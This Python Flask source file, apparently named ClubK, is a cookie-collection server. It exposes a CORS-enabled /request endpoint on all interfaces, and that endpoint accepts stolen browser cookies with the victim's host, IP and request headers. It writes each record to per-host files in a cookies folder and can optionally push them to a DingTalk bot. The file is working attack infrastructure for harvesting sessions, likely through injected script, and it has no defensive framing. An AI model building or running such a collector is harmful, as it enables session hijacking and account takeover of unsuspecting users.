# -*- coding: UTF-8 -*-
# @Project ：ClubK
# @File    ：ClubK.py
# Author   ：0xsdeo
# Date     ：2024/9/27 23:16
import os
import time
import json
import argparse
from flask import *
from flask_cors import CORS

from config import pem, key
from dingtalk_bot import boot


async def save_data(data, ip, header):
    global ding

    get_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    if ding:
        boot(get_time + '\n' + 'HOST：' + data['host'] + '\t\nip：' + ip + '\t' + '\nCookie: ' + data[
            'cookie'] + '\n\n' + 'Headers：\n' + header + '\n')

    header = header.replace("\n", "")

    if os.path.isdir(f"{os.getcwd()}/cookies"):
        with open(f"cookies/{data['hostname']}.txt", "a", encoding="utf-8") as f:
            f.write(get_time + '\n' + 'HOST：' + data['host'] + '\t\nip：' + ip + '\t' + '\nCookie: ' + data[
                'cookie'] + '\n\n' + 'Headers：\n' + header + '\n')
    else:
        os.mkdir(f"{os.getcwd()}/cookies")
        with open(f"cookies/{data['hostname']}.txt", "a", encoding="utf-8") as f:
            f.write(get_time + '\n' + 'HOST：' + data['host'] + '\t\nip：' + ip + '\t' + '\nCookie: ' + data[
                'cookie'] + '\n\n' + 'Headers：\n' + header + '\n')


app = Flask(__name__)
CORS(app, resources=r'/*')


@app.route('/request', methods=['POST'])
async def get_cookie():
    data = json.loads(request.get_data().decode())
    request_ip = request.remote_addr
    await save_data(data, request_ip, str(request.headers))
    return "success"


@app.route('/')
def index():
    return render_template('index.html')


arg = argparse.ArgumentParser()
arg.add_argument('-s', '--ssl', action="store_true", help="启用https，可选项")
arg.add_argument('--ding', action="store_true", help="启用钉钉机器人，可选项")
arg = arg.parse_args()

if __name__ == "__main__":
    ding = arg.ding

    if arg.ssl:
        ssl = (pem, key)
        app.run("0.0.0.0", port=5000, ssl_context=ssl)
    else:
        app.run("0.0.0.0", port=5000)
